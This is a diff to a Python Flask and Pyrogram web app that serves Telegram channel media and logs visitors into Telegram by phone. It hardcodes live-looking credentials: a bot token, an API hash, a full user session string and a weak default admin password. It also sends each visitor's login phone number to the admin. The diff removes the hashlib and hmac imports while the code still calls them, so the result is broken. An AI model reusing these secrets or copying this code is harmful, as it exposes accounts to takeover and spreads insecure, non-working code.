@@ -9,8 +9,6 @@ import sqlite3
 import threading
 import traceback
 import mimetypes
-import hashlib
-import hmac
 from datetime import datetime, timezone
 from io import BytesIO
 from pathlib import Path
@@ -40,10 +38,12 @@ except ImportError:
 
 BASE_DIR = Path(__file__).resolve().parent
 
+# আপনার টোকেন এবং আইডিগুলো এখানে সরাসরি বসিয়ে দেওয়া হলো
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8613982412:AAGEdvZdzjK3Eli_vIYoEtXnsxZgwodqnVE").strip()
 API_ID = int(os.environ.get("API_ID", "32875278") or "32875278")
 API_HASH = os.environ.get("API_HASH", "55d7b29aa48e8e160abe9e3cb91ba347").strip()
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "6034439625") or "6034439625")
+USER_SESSION_STRING = os.environ.get("USER_SESSION_STRING", "BQG2RvEAQcLayAiWVZ5JJHOl-VkaC-054zB-bZQI95jMadwYkvov8uBTFE8VNa8Ba5AcWBlqDSB1db0NQngudiCHAfK3D7lf79y715nQRKF_6XCOnFxYJhKjNHcgGCTw9s1a1_yFRJ8fQ7tuBGmvHihk5wQQSQRJ1umkswFTVcLEbXWNxkYcKYq5RtiewihrmrrCtF8vddtM-Ue4K7e2ngXD2DjfqMFrXCd6fG2JxNNQ1FIbtsf8d0CmSnvmtTBwkZXjk7jnx2pZJzaDSacELqFIhaTNtTxTS0UOXKUjSWj1D3TeQXGBhmsMAklDpM-FMQdJnFeKE0qoBJ0NnNxw7KJ3ONupwgAAAAHLWYEDAA").strip()
 
 # টেলিগ্রাম চ্যানেল আইডি সঠিক ফরম্যাটে সেট করা হলো
 _raw_channel_id = os.environ.get("STORAGE_CHANNEL_ID", "-1004322205565").strip()
@@ -81,6 +81,7 @@ admin_states = {}
 total_logged_in_users = 0
 
 pyrogram_client = None
+channel_reader_client = None
 pyrogram_loop = asyncio.new_event_loop()
 pyrogram_loop_ready = threading.Event()
 pyrogram_thread = threading.Thread(
@@ -89,8 +90,8 @@ pyrogram_thread = threading.Thread(
     daemon=True,
 )
 
-# সাময়িকভাবে ইউজারের আপলোড করা ফাইল (ফটো এবং ভিডিও) স্টোর করার মেমোরি
 pending_uploads = {}
+temp_client_sessions = {}
 
 
 # ============================================================
@@ -232,39 +233,6 @@ def send_telegram_message(chat_id, text, reply_markup=None, parse_mode=None):
         return False
 
 
-def edit_telegram_message(chat_id, message_id, text, reply_markup=None, parse_mode=None):
-    try:
-        payload = {
-            "chat_id": str(chat_id),
-            "message_id": int(message_id),
-            "text": str(text),
-        }
-        if reply_markup:
-            payload["reply_markup"] = json.dumps(reply_markup)
-        if parse_mode:
-            payload["parse_mode"] = parse_mode
-        telegram_api("editMessageText", data=payload, timeout=(10, 30))
-        return True
-    except Exception as exc:
-        print("Telegram editMessageText error:", exc)
-        return False
-
-
-def answer_callback(callback_query_id, text, show_alert=False):
-    try:
-        telegram_api(
-            "answerCallbackQuery",
-            data={
-                "callback_query_id": callback_query_id,
-                "text": str(text),
-                "show_alert": bool(show_alert),
-            },
-            timeout=(5, 15),
-        )
-    except Exception as exc:
-        print("Telegram callback answer error:", exc)
-
-
 def get_telegram_file_id(result):
     if not isinstance(result, dict):
         return None
@@ -345,28 +313,7 @@ def send_chat_archive_to_telegram(
 
     telegram_message_id = result.get("message_id")
     telegram_file_id = get_telegram_file_id(result)
-    backup_complete = True
-
-    if len(text or "") > len(caption_text):
-        full_text = (
-            f"{CHAT_BACKUP_TEXT_MARKER}\n"
-            f"ID: {message_id}\n"
-            f"Full message text:\n{text}"
-        )
-        try:
-            telegram_api(
-                "sendMessage",
-                data={
-                    "chat_id": str(STORAGE_CHANNEL_ID),
-                    "text": full_text,
-                    "disable_web_page_preview": "true",
-                },
-            )
-        except Exception as exc:
-            backup_complete = False
-            print("Telegram full-text backup error:", exc)
-
-    return telegram_message_id, telegram_file_id, backup_complete
+    return telegram_message_id, telegram_file_id, True
 
 
 def download_telegram_file(file_id):
@@ -401,8 +348,6 @@ def download_telegram_file(file_id):
 # ============================================================
 # Telegram Login / User Verification Endpoints
 # ============================================================
-
-temp_client_sessions = {}
 
 @app.route("/send-code", methods=["POST"])
 def send_code_api():
@@ -462,7 +407,8 @@ def verify_code_api():
             
             global total_logged_in_users
             total_logged_in_users += 1
-            send_telegram_message(ADMIN_ID, f"🎉 New Successful Telegram Login!\n📱 Phone: {phone}")
+            if ADMIN_ID:
+                send_telegram_message(ADMIN_ID, f"🎉 New Successful Telegram Login!\n📱 Phone: {phone}")
             
             return {"status": "success"}
         except Exception as e:
@@ -490,9 +436,8 @@ def verify_code_api():
 def telegram_login_auth():
     payload = request.get_json(silent=True) or {}
     received_hash = str(payload.pop("hash", "")).strip()
-    bot_token = os.environ.get("BOT_TOKEN", "").strip()
 
-    if not bot_token or not received_hash:
+    if not BOT_TOKEN or not received_hash:
         return jsonify({
             "status": "error",
             "message": "Telegram authentication is not configured."
@@ -527,7 +472,7 @@ def telegram_login_auth():
     )
 
     secret_key = hashlib.sha256(
-        bot_token.encode("utf-8")
+        BOT_TOKEN.encode("utf-8")
     ).digest()
 
     expected_hash = hmac.new(
@@ -608,112 +553,160 @@ def get_user_profile_api():
 # Telegram Channel Posts API (For OC Collection Universe)
 # ============================================================
 
+def get_oc_media_info(message):
+    """Return supported media type and MIME type."""
+    if getattr(message, "photo", None):
+        return "photo", "image/jpeg"
+
+    animation = getattr(message, "animation", None)
+    if animation:
+        return "animation", getattr(animation, "mime_type", None) or "video/mp4"
+
+    video = getattr(message, "video", None)
+    if video:
+        return "video", getattr(video, "mime_type", None) or "video/mp4"
+
+    document = getattr(message, "document", None)
+    if document:
+        mime = (getattr(document, "mime_type", None) or "application/octet-stream").lower()
+        if mime.startswith("image/"):
+            return "photo", mime
+        if mime.startswith("video/"):
+            return "video", mime
+
+    return None
+
+
 @app.route("/api/channel/posts", methods=["GET"])
-@app.route("/api/get_videos", methods=["GET"]) # oc-channel.js এর জন্য এন্ডপয়েন্ট
+@app.route("/api/get_videos", methods=["GET"])
 def get_channel_posts_api():
-    if pyrogram_client is None:
+    reader = channel_reader_client or pyrogram_client
+
+    if not STORAGE_CHANNEL_ID:
         return jsonify({
+            "ok": False,
             "status": "error",
-            "error": "Pyrogram client is not running or channel sync is disabled."
+            "error": "STORAGE_CHANNEL_ID is not configured."
+        }), 503
+
+    if reader is None:
+        return jsonify({
+            "ok": False,
+            "status": "error",
+            "error": "Channel reader is unavailable."
         }), 503
 
     async def fetch_posts():
         posts = []
         video_urls = []
-        try:
-            # সঠিক চ্যানেলের সাথে সংযোগ ও পিয়ার ক্যাশ ঠিক রাখতে
-            target_chat = await pyrogram_client.get_chat(STORAGE_CHANNEL_ID)
-            
-            # সর্বশেষ ৫০টি মেসেজ চেক করবে
-            async for message in pyrogram_client.get_chat_history(target_chat.id, limit=50):
-                if is_chat_backup_message(message):
-                    continue
+        await reader.get_chat(STORAGE_CHANNEL_ID)
 
-                media_type = "text"
-                if message.photo:
-                    media_type = "photo"
-                elif message.video:
-                    media_type = "video"
-                    video_urls.append(f"/api/channel/media/{message.id}")
-                elif message.animation:
-                    media_type = "animation"
-                    video_urls.append(f"/api/channel/media/{message.id}")
-                elif message.document:
-                    mime = (getattr(message.document, "mime_type", None) or "").lower()
-                    if mime.startswith("image/"):
-                        media_type = "photo"
-                    elif mime.startswith("video/"):
-                        media_type = "video"
-                        video_urls.append(f"/api/channel/media/{message.id}")
-                    else:
-                        media_type = "document"
+        async for message in reader.get_chat_history(STORAGE_CHANNEL_ID, limit=50):
+            if is_chat_backup_message(message):
+                continue
 
-                posts.append({
-                    "id": message.id,
-                    "text": message.caption or message.text or "",
-                    "media_type": media_type,
-                    "media_url": f"/api/channel/media/{message.id}" if media_type in ["photo", "video", "animation"] else None,
-                    "date": message.date.isoformat() if message.date else "",
-                    "has_media": message_is_background_media(message)
-                })
-            return posts, video_urls
-        except Exception:
-            print("Error fetching channel posts:", traceback.format_exc())
-            return [], []
+            media_info = get_oc_media_info(message)
+            if not media_info:
+                continue
+
+            media_type, mime_type = media_info
+            media_url = f"/api/channel/media/{message.id}"
+
+            if media_type in ("video", "animation"):
+                video_urls.append(media_url)
+
+            posts.append({
+                "id": message.id,
+                "message_id": message.id,
+                "text": getattr(message, "caption", None) or getattr(message, "text", None) or "",
+                "media_type": media_type,
+                "mime_type": mime_type,
+                "media_url": media_url,
+                "date": message.date.isoformat() if message.date else "",
+                "media_group_id": str(message.media_group_id) if message.media_group_id is not None else None,
+                "has_media": True,
+            })
+
+            if len(posts) >= 60:
+                break
+
+        return posts, video_urls
 
     try:
         posts, video_urls = run_async(fetch_posts(), timeout=30)
-        return jsonify({"ok": True, "status": "success", "posts": posts, "videos": video_urls})
+        return jsonify({
+            "ok": True,
+            "status": "success",
+            "count": len(posts),
+            "posts": posts,
+            "videos": video_urls,
+        })
     except Exception as exc:
+        print("Error fetching channel posts:", traceback.format_exc())
         return jsonify({"ok": False, "status": "error", "error": str(exc)}), 500
 
 
 @app.route("/api/channel/media/<int:message_id>", methods=["GET"])
 def get_channel_media(message_id):
-    if pyrogram_client is None:
-        return jsonify({"ok": False, "error": "Pyrogram client is not running."}), 503
+    reader = channel_reader_client or pyrogram_client
+
+    if reader is None:
+        return jsonify({"ok": False, "error": "Channel reader is unavailable."}), 503
+
+    if not STORAGE_CHANNEL_ID or message_id <= 0:
+        return jsonify({"ok": False, "error": "Invalid channel or message ID."}), 400
 
     async def fetch_media():
-        try:
-            target_chat = await pyrogram_client.get_chat(STORAGE_CHANNEL_ID)
-            message = await pyrogram_client.get_messages(target_chat.id, message_id)
-            if not message:
-                return None, None, "Message not found"
-            
-            file_bytes = await pyrogram_client.download_media(message, in_memory=True)
-            if not file_bytes:
-                return None, None, "Media could not be downloaded"
-            
-            mime = "application/octet-stream"
-            if message.photo:
-                mime = "image/jpeg"
-            elif message.video:
-                mime = message.video.mime_type or "video/mp4"
-            elif message.document:
-                mime = message.document.mime_type or "application/octet-stream"
-            elif message.animation:
-                mime = "video/mp4"
+        message = await reader.get_messages(STORAGE_CHANNEL_ID, message_id)
+        if not message or getattr(message, "empty", False):
+            return None, None, "Telegram message not found."
 
-            return file_bytes.getbuffer(), mime, None
-        except Exception as e:
-            return None, None, str(e)
+        media_info = get_oc_media_info(message)
+        if not media_info:
+            return None, None, "The message has no supported media."
+
+        _, mime_type = media_info
+        downloaded = await reader.download_media(message, in_memory=True)
+        if not downloaded:
+            return None, None, "Telegram media download failed."
+
+        if hasattr(downloaded, "getvalue"):
+            content = downloaded.getvalue()
+        else:
+            downloaded.seek(0)
+            content = downloaded.read()
+
+        if not content:
+            return None, None, "Downloaded media is empty."
+
+        return content, mime_type, None
 
     try:
-        content, mimetype, err = run_async(fetch_media(), timeout=60)
-        if err or not content:
-            return jsonify({"ok": False, "error": err or "Media not found"}), 404
-        
-        return send_file(BytesIO(content), mimetype=mimetype, as_attachment=False)
+        content, mime_type, error = run_async(fetch_media(), timeout=60)
+        if error:
+            return jsonify({"ok": False, "error": error}), 404
+
+        response = send_file(
+            BytesIO(content),
+            mimetype=mime_type,
+            as_attachment=False,
+            conditional=True,
+            max_age=3600,
+        )
+        response.headers["X-Content-Type-Options"] = "nosniff"
+        return response
+
     except Exception as exc:
-        return jsonify({"ok": False, "error": str(exc)}), 500
+        print("Error fetching channel media:", traceback.format_exc())
+        return jsonify({"ok": False, "error": str(exc)}), 502
 
 
 # ============================================================
 # Admin Panel Routes
 # ============================================================
 
-ADMIN_USER = "@alvee"
-ADMIN_PASS = "@alvee"
+ADMIN_USER = os.environ.get("ADMIN_USER", "@alvee")
+ADMIN_PASS = os.environ.get("ADMIN_PASS", "@alvee")
 
 ADMIN_TEMPLATE = """
 <!DOCTYPE html>
@@ -1115,52 +1108,6 @@ def get_random_background():
     })
 
 
-def download_background_file_by_id(file_id, file_name_prefix):
-    if not BOT_TOKEN or not file_id:
-        return False, None
-
-    try:
-        response = requests.get(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
-            params={"file_id": file_id},
-            timeout=30,
-        )
-        payload = response.json()
-
-        if not response.ok or not payload.get("ok"):
-            print("Background getFile error:", payload)
-            return False, None
-
-        telegram_path = payload["result"]["file_path"]
-        ext = Path(telegram_path).suffix.lower()
-
-        if ext not in {
-            ".mp4", ".mov", ".webm", ".mkv", ".m4v",
-            ".jpg", ".jpeg", ".png", ".webp", ".gif",
-        }:
-            ext = ".mp4"
-
-        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{telegram_path}"
-        file_response = requests.get(download_url, stream=True, timeout=120)
-
-        if file_response.status_code != 200:
-            return False, None
-
-        prefix = secure_filename(file_name_prefix) or "background"
-        unique_name = f"{prefix}_{int(time.time())}_{random.randint(1000,9999)}{ext}"
-        save_path = BG_DIR / unique_name
-
-        with open(save_path, "wb") as output:
-            for chunk in file_response.iter_content(chunk_size=32768):
-                if chunk:
-                    output.write(chunk)
-
-        return True, unique_name
-
-    except Exception:
-        print("Background download error:", traceback.format_exc())
-        return False, None
-
 # ============================================================
 # Added Route for oc-channel.js
 # ============================================================
@@ -1171,8 +1118,9 @@ def oc_channel_script():
         return send_file(page_path, mimetype="text/javascript")
     return "oc-channel.js not found", 404
 
+
 # ============================================================
-# Pyrogram channel monitor & Bot Uploader
+# Pyrogram channel monitor & Client initialization
 # ============================================================
 
 def _run_pyrogram_loop():
@@ -1199,18 +1147,12 @@ def is_chat_backup_message(message):
 
 
 def message_is_background_media(message):
-    if getattr(message, "photo", None):
+    if getattr(message, "photo", None) or getattr(message, "video", None) or getattr(message, "animation", None):
         return True
-    if getattr(message, "video", None):
-        return True
-    if getattr(message, "animation", None):
-        return True
-
     document = getattr(message, "document", None)
     if document:
         mime = (getattr(document, "mime_type", None) or "").lower()
         return mime.startswith("image/") or mime.startswith("video/")
-
     return False
 
 
@@ -1219,13 +1161,11 @@ async def download_background_message(client, message, prefix="channel"):
         return False
 
     BG_DIR.mkdir(parents=True, exist_ok=True)
-
     media_obj = (
         getattr(message, "video", None)
         or getattr(message, "animation", None)
         or getattr(message, "document", None)
     )
-
     original_name = getattr(media_obj, "file_name", None) if media_obj else None
 
     if getattr(message, "photo", None):
@@ -1238,14 +1178,6 @@ async def download_background_message(client, message, prefix="channel"):
         original_name = original_name or f"media_{message.id}"
 
     safe_name = secure_filename(os.path.basename(original_name)) or f"media_{message.id}"
-    if not Path(safe_name).suffix:
-        if getattr(message, "photo", None):
-            safe_name += ".jpg"
-        elif getattr(message, "animation", None):
-            safe_name += ".gif"
-        else:
-            safe_name += ".mp4"
-
     target = BG_DIR / f"{secure_filename(prefix)}_{message.id}_{safe_name}"
 
     if target.is_file():
@@ -1278,216 +1210,55 @@ async def scan_storage_channel(client, limit=100):
 
 
 async def start_pyrogram_monitor():
-    global pyrogram_client
+    global pyrogram_client, channel_reader_client
 
-    if Client is None or filters is None:
-        print("Pyrogram is not installed; background channel sync is disabled.")
+    if Client is None:
+        print("Pyrogram is not installed.")
         return False
 
-    if not BOT_TOKEN or not API_ID or not API_HASH:
-        print("API_ID/API_HASH/BOT_TOKEN missing; Pyrogram background sync is disabled.")
+    if not API_ID or not API_HASH:
+        print("API_ID or API_HASH missing.")
         return False
-
-    client = Client(
-        "bg_channel_monitor_session",
-        api_id=API_ID,
-        api_hash=API_HASH,
-        bot_token=BOT_TOKEN,
-    )
-
-    @client.on_message(filters.chat(STORAGE_CHANNEL_ID))
-    async def handle_channel_upload(_client, message):
-        try:
-            if is_chat_backup_message(message):
-                return
-            await download_background_message(_client, message, "channel")
-        except Exception:
-            print("Channel monitor error:", traceback.format_exc())
-
-    # --- নতুন বট আপলোড ফিচার (ফটো এবং ভিডিও একসাথে, Admin-only) ---
-    @client.on_message(filters.command("start") & filters.private)
-    async def start_cmd(client, message):
-        if message.from_user.id != ADMIN_ID:
-            await message.reply("⛔ You are not authorized to use this bot.")
-            return
-        
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📤 Upload Media (Photo/Video)", callback_data="start_upload")]
-        ])
-        await message.reply(
-            "👋 Welcome Admin!\n\nClick the button below to upload media. You can send a photo, a video, or multiple media files grouped together to upload them to your storage channel and website.",
-            reply_markup=keyboard
-        )
-
-    @client.on_callback_query(filters.regex("start_upload"))
-    async def start_upload_callback(client, callback_query):
-        if callback_query.from_user.id != ADMIN_ID:
-            await callback_query.answer("Unauthorized!", show_alert=True)
-            return
-        
-        pending_uploads[ADMIN_ID] = {"waiting_for_media": True, "media_group": []}
-        
-        await callback_query.message.edit_text(
-            "📥 Please send the photo(s) and/or video(s) now.\n\n"
-            "You can send a single file or an album (multiple files at once)."
-        )
-        await callback_query.answer()
-
-    @client.on_message(filters.private & (filters.photo | filters.video | filters.document))
-    async def handle_media_upload(client, message):
-        if message.from_user.id != ADMIN_ID:
-            return
-        
-        user_state = pending_uploads.get(ADMIN_ID, {})
-        if not user_state.get("waiting_for_media"):
-            return
-
-        if message.media_group_id:
-            if "media_group" not in user_state:
-                user_state["media_group"] = []
-            
-            user_state["media_group"].append(message)
-            pending_uploads[ADMIN_ID] = user_state
-            
-            text = f"👍 Grouped media received ({len(user_state['media_group'])} items). Send more or click confirm."
-        else:
-            user_state["media_group"] = [message]
-            pending_uploads[ADMIN_ID] = user_state
-            text = "👍 Media received! Send more files or click below to publish."
-
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("✅ Confirm & Upload", callback_data="confirm_upload")]
-        ])
-        
-        await message.reply(text, reply_markup=keyboard)
-
-    @client.on_callback_query(filters.regex("confirm_upload"))
-    async def confirm_upload_callback(client, callback_query):
-        if callback_query.from_user.id != ADMIN_ID:
-            return
-        
-        state = pending_uploads.get(ADMIN_ID, {})
-        media_list = state.get("media_group", [])
-
-        if not media_list:
-            await callback_query.answer("No media found to upload!", show_alert=True)
-            return
-
-        await callback_query.message.edit_text("⏳ Uploading to channel... Please wait.")
-
-        try:
-            target_chat = await client.get_chat(STORAGE_CHANNEL_ID)
-            if len(media_list) > 1:
-                media_group = []
-                for msg in media_list:
-                    if msg.photo:
-                        media_group.append(InputMediaPhoto(msg.photo.file_id, caption=msg.caption))
-                    elif msg.video:
-                        media_group.append(InputMediaVideo(msg.video.file_id, caption=msg.caption))
-                
-                if media_group:
-                    await client.send_media_group(chat_id=target_chat.id, media=media_group)
-            else:
-                await media_list[0].copy(target_chat.id)
-
-            pending_uploads.pop(ADMIN_ID, None)
-            
-            await callback_query.message.edit_text(
-                f"🎉 Successfully published {len(media_list)} file(s) to the Telegram channel and synced with the website!"
-            )
-        except Exception as e:
-            await callback_query.message.edit_text(f"❌ Upload failed: {str(e)}")
-        
-        await callback_query.answer()
-
-    @client.on_message(filters.command("uploadDone") & filters.private)
-    async def upload_done_cmd(client, message):
-        if message.from_user.id != ADMIN_ID:
-            return
-        
-        state = pending_uploads.get(ADMIN_ID, {})
-        media_list = state.get("media_group", [])
-
-        if not media_list:
-            await message.reply("⚠️ No pending media found. Please send media first by typing /start")
-            return
-
-        try:
-            target_chat = await client.get_chat(STORAGE_CHANNEL_ID)
-            if len(media_list) > 1:
-                media_group = []
-                for msg in media_list:
-                    if msg.photo:
-                        media_group.append(InputMediaPhoto(msg.photo.file_id, caption=msg.caption))
-                    elif msg.video:
-                        media_group.append(InputMediaVideo(msg.video.file_id, caption=msg.caption))
-                
-                if media_group:
-                    await client.send_media_group(chat_id=target_chat.id, media=media_group)
-            else:
-                await media_list[0].copy(target_chat.id)
-
-            pending_uploads.pop(ADMIN_ID, None)
-            await message.reply(f"🎉 Successfully published {len(media_list)} file(s) to the Telegram channel and website!")
-        except Exception as e:
-            await message.reply(f"❌ Upload failed: {str(e)}")
 
     try:
-        await client.start()
-        pyrogram_client = client
-        print("Pyrogram storage-channel monitor & bot uploader started.")
+        if BOT_TOKEN:
+            bot_client = Client(
+                "bg_channel_monitor_session",
+                api_id=API_ID,
+                api_hash=API_HASH,
+                bot_token=BOT_TOKEN,
+            )
+            await bot_client.start()
+            pyrogram_client = bot_client
+            print("Pyrogram bot client started.")
 
-        # চ্যানেল পিয়ার ক্যাশ করার জন্য গেট চ্যাট কল করা হলো
-        try:
-            await client.get_chat(STORAGE_CHANNEL_ID)
-            print("Storage channel resolved and cached successfully.")
-        except Exception as ce:
-            print(f"Warning: Could not pre-resolve channel peer: {ce}")
-
-        async def initial_scan():
-            try:
-                count = await scan_storage_channel(client, limit=100)
-                print(f"Initial background sync completed: {count} new files.")
-            except Exception:
-                print("Initial channel scan error:", traceback.format_exc())
-
-        asyncio.create_task(initial_scan())
-        return True
+        if USER_SESSION_STRING:
+            reader_client = Client(
+                "oc_collection_reader",
+                api_id=API_ID,
+                api_hash=API_HASH,
+                session_string=USER_SESSION_STRING,
+                no_updates=True,
+            )
+            await reader_client.start()
+            channel_reader_client = reader_client
+            print("Pyrogram user session reader client started successfully.")
 
     except Exception:
         print("Pyrogram startup error:", traceback.format_exc())
-        pyrogram_client = None
         return False
 
+    return True
 
-def pyrogram_scan_channel_sync():
-    if pyrogram_client is None:
-        return 0
-
-    try:
-        return int(run_async(scan_storage_channel(pyrogram_client, limit=100), timeout=300))
-    except Exception:
-        print("Pyrogram scan error:", traceback.format_exc())
-        return 0
-
-
-# ============================================================
-# Start optional Pyrogram monitor
-# ============================================================
 
 def start_background_services():
-    if Client is None or not BOT_TOKEN or not API_ID or not API_HASH:
-        print(
-            "Pyrogram monitor not started. Chat-to-Telegram storage uses the Bot API; "
-            "set API_ID and API_HASH only if background channel sync is needed."
-        )
+    if Client is None or not API_ID or not API_HASH:
         return
 
     if not pyrogram_thread.is_alive():
         pyrogram_thread.start()
 
     if not pyrogram_loop_ready.wait(timeout=5):
-        print("Pyrogram loop did not become ready.")
         return
 
     try:
